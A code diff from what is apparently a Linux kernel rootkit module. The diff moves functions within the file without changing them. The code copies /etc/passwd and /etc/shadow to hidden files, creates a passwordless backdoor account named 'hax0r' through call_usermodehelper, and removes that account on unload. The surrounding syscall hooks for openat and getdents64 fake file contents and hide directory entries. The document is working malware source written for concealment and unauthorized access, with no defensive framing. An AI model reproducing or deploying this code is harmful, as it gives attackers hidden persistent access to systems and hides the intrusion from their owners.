@@ -70,6 +70,110 @@ static void *original_syscallPtrs[NUM_TARGETS];    //array to store ptrs to the 
 static void *totallyReal_syscallPtrs[NUM_TARGETS]; //array to store ptrs to our fake syscall functions
 static bool toInject[NUM_TARGETS] = {0};           //array to toggle which targets to intercept (default all 0 unless changed in loadMod)
 
+
+/**
+ * Create old (fake) passwd & shadow file
+ * Basically, a copy of the /etc/passwd file and /etc/shadow file before we add our secret user
+ */
+void create_fake_files(void)
+{
+    char *envp[] = {"HOME=/", NULL};
+
+    // NOTE: probably want to hide these files with the "ls" part of the rootkit
+    char *argv1[] = {"/bin/cp", "/etc/passwd", "/etc/secretpasswd", NULL};
+    char *argv2[] = {"/bin/cp", "/etc/shadow", "/etc/secretshadow", NULL};
+
+    printk(KERN_INFO "attempting to duplicate/create fake files\n");
+
+    if (call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC) < 0)
+    {
+        printk(KERN_INFO "unable to copy passwd\n");
+    }
+
+    if (call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC) < 0)
+    {
+        printk(KERN_INFO "unable to copy shadow\n");
+    }
+}
+
+/**
+ * Create the backdoor user, which would be hidden while module is loaded
+ */
+void create_backdoor_user(void)
+{
+    char *envp[] = {"HOME=/", NULL};
+
+    // add "-p" followed by a hashed password to specify a password.
+    // currently, anyone can login to the account without a password.
+    // char *argv[] = { "/usr/sbin/useradd", "-u", "33333", "-g", "haxor", "-d", "/home/haxor", "-s", "/bin/bash", "haxor", NULL };
+    char *argv[] = {"/usr/sbin/useradd", "hax0r", NULL};
+
+    printk(KERN_INFO "attempting to create hacker user\n");
+
+    if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC) < 0)
+    {
+        printk(KERN_INFO "unable to create backdoor user\n");
+    }
+
+    return;
+}
+
+/**
+ * Removes the backdoor user
+ */
+void remove_backdoor_user(void)
+{
+    vol_disable_h = 1;
+
+    char *envp[] = {"HOME=/", NULL};
+    char *argv[] = {"/usr/sbin/deluser", "hax0r", NULL};
+
+    printk(KERN_INFO "attempting to remove hacker user\n");
+
+    if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC) < 0)
+    {
+        printk(KERN_INFO "unable to remove backdoor user\n");
+    }
+
+    return;
+}
+
+struct file * file_open(const char * path, int flags, int rights) {
+	struct file *filp = NULL;
+	mm_segment_t oldfs;
+	int err = 0;
+	oldfs = get_fs();
+	set_fs(get_ds());
+	filp = filp_open(path, flags, rights);
+	set_fs(oldfs);
+	if (IS_ERR(filp)) {
+		err = PTR_ERR(filp);
+		return NULL;
+	}
+	return filp;
+}
+
+int file_read(struct file *f, unsigned long long offset, unsigned char *data, unsigned int size) {
+	mm_segment_t oldfs;
+	int result;
+	
+	oldfs = get_fs();
+	set_fs(get_ds());
+	result = vfs_read( f, data, size, &offset);
+	set_fs(oldfs);
+	return result;
+}
+
+char * get_cmdline_path(char * buf, char * pid) {
+	int i = 0;
+	for (i = 0; i < BUF_SIZE; i++)
+		buf[i] = 0;
+	strcat( buf, "/proc/" );
+	strcat( buf, pid);
+	strcat( buf, "/cmdline" );
+	return buf;
+}
+
 asmlinkage long totallyReal_openat(int dirfd, const char *pathname, int flags, mode_t mode) {
   if (strstr(pathname, "/etc/passwd") != NULL) {
     pr_info("openAt called (open) path:%s, fd:%d\n", pathname, dirfd);
@@ -264,109 +368,6 @@ asmlinkage long totallyReal_getdents64(int fd, struct linux_dirent64 * dirp, uns
 	copy_to_user(dirp, mod_dirp, nread);
 	kvfree(mod_dirp);
 	return nread;
-}
-
-/**
- * Create old (fake) passwd & shadow file
- * Basically, a copy of the /etc/passwd file and /etc/shadow file before we add our secret user
- */
-void create_fake_files(void)
-{
-    char *envp[] = {"HOME=/", NULL};
-
-    // NOTE: probably want to hide these files with the "ls" part of the rootkit
-    char *argv1[] = {"/bin/cp", "/etc/passwd", "/etc/secretpasswd", NULL};
-    char *argv2[] = {"/bin/cp", "/etc/shadow", "/etc/secretshadow", NULL};
-
-    printk(KERN_INFO "attempting to duplicate/create fake files\n");
-
-    if (call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC) < 0)
-    {
-        printk(KERN_INFO "unable to copy passwd\n");
-    }
-
-    if (call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC) < 0)
-    {
-        printk(KERN_INFO "unable to copy shadow\n");
-    }
-}
-
-/**
- * Create the backdoor user, which would be hidden while module is loaded
- */
-void create_backdoor_user(void)
-{
-    char *envp[] = {"HOME=/", NULL};
-
-    // add "-p" followed by a hashed password to specify a password.
-    // currently, anyone can login to the account without a password.
-    // char *argv[] = { "/usr/sbin/useradd", "-u", "33333", "-g", "haxor", "-d", "/home/haxor", "-s", "/bin/bash", "haxor", NULL };
-    char *argv[] = {"/usr/sbin/useradd", "hax0r", NULL};
-
-    printk(KERN_INFO "attempting to create hacker user\n");
-
-    if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC) < 0)
-    {
-        printk(KERN_INFO "unable to create backdoor user\n");
-    }
-
-    return;
-}
-
-/**
- * Removes the backdoor user
- */
-void remove_backdoor_user(void)
-{
-    vol_disable_h = 1;
-
-    char *envp[] = {"HOME=/", NULL};
-    char *argv[] = {"/usr/sbin/deluser", "hax0r", NULL};
-
-    printk(KERN_INFO "attempting to remove hacker user\n");
-
-    if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC) < 0)
-    {
-        printk(KERN_INFO "unable to remove backdoor user\n");
-    }
-
-    return;
-}
-
-struct file * file_open(const char * path, int flags, int rights) {
-	struct file *filp = NULL;
-	mm_segment_t oldfs;
-	int err = 0;
-	oldfs = get_fs();
-	set_fs(get_ds());
-	filp = filp_open(path, flags, rights);
-	set_fs(oldfs);
-	if (IS_ERR(filp)) {
-		err = PTR_ERR(filp);
-		return NULL;
-	}
-	return filp;
-}
-
-int file_read(struct file *f, unsigned long long offset, unsigned char *data, unsigned int size) {
-	mm_segment_t oldfs;
-	int result;
-	
-	oldfs = get_fs();
-	set_fs(get_ds());
-	result = vfs_read( f, data, size, &offset);
-	set_fs(oldfs);
-	return result;
-}
-
-char * get_cmdline_path(char * buf, char * pid) {
-	int i = 0;
-	for (i = 0; i < BUF_SIZE; i++)
-		buf[i] = 0;
-	strcat( buf, "/proc/" );
-	strcat( buf, pid);
-	strcat( buf, "/cmdline" );
-	return buf;
 }
 
 void injectSyscalls(void)
